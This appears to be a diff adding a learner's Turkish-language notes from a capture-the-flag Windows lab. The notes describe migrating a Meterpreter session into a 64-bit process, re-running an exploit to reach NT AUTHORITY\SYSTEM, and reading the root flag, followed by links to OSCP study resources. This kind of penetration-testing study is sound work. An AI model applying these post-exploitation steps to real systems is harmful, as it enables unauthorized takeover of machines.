+Architecture: x64 (bu sistemin mimarisi yani 64 bit te çalıştığını ifade ediyor)
+
+Meterpreter: x86/windows 
+
+bizim meterpreter shell imizi 64 bit e geçirmemiz lazım bunun için;
+
+ps > gelen çıktıda Name i cmd.exe nin yani bizim meterpreter shell imizin Arch = x86 yazıyor 
+
+PID = 1184 Name: jrun.exe Arch = x64 olduğunu görüyoruz (pid değişiklik gösterebilir)
+
+migrate 1184 > sysinfo çalıştırdığımıza Meterpreter: x64 bit olduğunu görürüz 
+
+(shell imizi 64 bitte kullanmak daha düzgün bir bağlantı sağlar bize sistemde)
+
+background > exploit (bunu yaptıktan sonra çalışmaz ise show options dan az önceki ayarları yapıp tekrar dene)
+
+ardından exploit etme işlemi tamamlandıktan sonra getuid çalıştırırsak 
+
+NT AUTHORITY\SYSTEM yani root olmayı başardık.
+
+pwd çalıştırdığımızda C:\Windows\system32 nin içerisinde olduğumuzu görüyoruz.
+
+cd .. > cd .. > cd Users > cd Administrator > cd Desktop > cat root.txt yi çalıştırarak root flagimizi alabiliriz.
+
+https://sushant747.gitbooks.io/total-oscp-guide/content/ bu bağlantıda IT Security ile ilgili pek çok konu hakkında bilgiler bulabiliriz oscp ye hazırlanan birisi bunu kendisine not olarak hazırlamış.
+
+hacktrick kitabını da kaynaklar arasına not et
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
